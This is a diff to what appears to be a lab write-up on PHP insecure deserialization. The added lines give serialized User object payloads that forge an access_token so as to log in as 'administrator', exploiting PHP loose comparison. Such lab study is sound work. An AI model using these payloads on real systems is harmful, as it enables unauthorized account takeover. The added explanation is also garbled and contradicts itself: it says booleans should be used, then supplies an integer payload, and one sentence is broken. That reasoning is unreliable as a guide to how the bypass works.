@@ -80,4 +80,5 @@ if ($login['password'] == $password) {
 ```
 PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx, $user->;access_token = 1, $access_tokens = [xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx]) Invalid access token for user carlos in /var/www/index.php:8
 ```
-- `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}`
+- My first attempt at exploiting this failed because I attempted an integer substitution of the access_token `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:1;}` but this wasn't working - why? Well, it's probably because the access token begins with an integer! So `i:1` failed for me because 1 == DOES NOT whatever integer the access token starts with.
+- Okay, well since we don't want to play guess the integer, how about we use booleans? Remember `true` equals any string that is not empty so `true == "abc123"` or `true == "123abc"`. Let's do `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`.
